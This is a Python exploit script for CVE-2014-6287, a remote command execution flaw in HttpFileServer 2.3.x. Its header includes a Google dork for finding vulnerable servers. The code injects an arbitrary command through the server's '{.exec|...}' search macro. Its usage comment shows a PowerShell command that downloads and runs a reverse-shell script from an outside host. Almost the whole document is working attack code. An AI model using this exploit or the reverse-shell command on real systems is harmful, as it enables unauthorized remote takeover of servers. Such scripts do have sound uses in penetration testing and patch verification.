#!/usr/bin/python3
#
# Exploit Title: HttpFileServer 2.3.x Remote Command Execution
# Google Dork: intext:"httpfileserver 2.3"
# Date: 28-11-2020
# Remote: Yes
# Exploit Author: Ã“scar Andreu
# Vendor Homepage: http://rejetto.com/
# Software Link: http://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7
# CVE : CVE-2014-6287
# Description: Code execution vulnerability
 
#Usage : python3 Exploit.py <Target IP address> <Target Port Number> <Command>
# python3 HttpFileServer_simple.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.4/shells/mini-reverse.ps1')"

import urllib3
import sys
import urllib.parse

try:
	http = urllib3.PoolManager()	
	url = "http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+exec|"+urllib.parse.quote(sys.argv[3])+".}"
	print(url)
	response = http.request('GET', url)
	
except Exception as ex:
	print("Usage: HttpFileServer.py RHOST RPORT command")
	print(ex)